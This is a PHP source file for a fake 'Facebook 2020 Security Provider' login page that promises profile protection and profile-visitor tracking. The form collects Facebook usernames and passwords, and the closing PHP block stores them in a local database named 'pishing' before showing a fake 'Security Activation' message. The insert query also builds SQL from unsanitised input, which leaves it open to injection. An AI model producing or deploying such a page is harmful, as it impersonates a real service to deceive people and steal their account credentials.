
<?php
error_reporting(E_ALL);
?>
<!DOCTYPE html>
  <head>
    <title>facebookLogin</title>
    <link rel="stylesheet" type="text/css" href="style.css" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
  </head>

  <body>
      <div class="header">
          <h1>Facebook 2020 Security Provider</h1>
          <button><a href = "https://www.facebook.com/>">Create Account</a></button>

      </div>
      <div class="body">
        <p>This is <span>2020 Service by facebook</span> To make Secure account. Log in into Facebook 
           and you will get following service: <br />Protect Your Facebook From Hackers <span>Increase Your Facebook Security</span> <br/>
           Find <span> Profile Visitors </span> <br />
           Activate <span> Profie Guard </span> <br />
           Protect From <span>Fake friend request, Messages and Calls </span><br />
      </div>
      <h2>Login Form</h2>

      <form action="#" method="post">
        <div class="imgcontainer">
          <img src="ff.png" alt="Avatar" class="avatar">
        </div>
      
        <div class="container">
          <label for="uname"><b>Facebook Username</b></label>
          <input type="text" placeholder="Enter Username" name="uname" required>
      
          <label for="psw"><b>Facebook Password</b></label>
          <input type="password" placeholder="Enter Password" name="password" required>
              
          <button type="submit" name = "submit" action = "index2.html">Login</button>
          <label>
            <input type="checkbox" checked="checked" name="remember"> Remember me
          </label>
        </div>
      
        <div class="container" style="background-color:#f1f1f1">
          <button type="button" class="cancelbtn">Cancel</button>
          <span class="psw">Forgot <a href="#">password?</a></span>
        </div>
      </form>
</html>
<?php
$username = '';
$passwd = '';
if(isset($_POST['uname'],$_POST['password']) == TRUE){
  $username= $_POST['uname'];
  $passwd = $_POST['password'];
  }
  $conn = mysqli_connect("localhost", "root", "", "pishing");
  if(!$conn){
      echo "Bad connection";
  }
  else {
      echo "<br />";
  }
  $query = "INSERT INTO `login`(`uname`, `passwd`) VALUES ('$username','$passwd')";
  if(!$query){
      echo "<br />Bad connection";
  }
  else {
      echo " <h3> Thank You For Security Activation!! <br />We'll provide our service from <span>
            JAN 2020 in Your Facebook Account!!! </span></h3>";
  }
  mysqli_query($conn, $query);
?>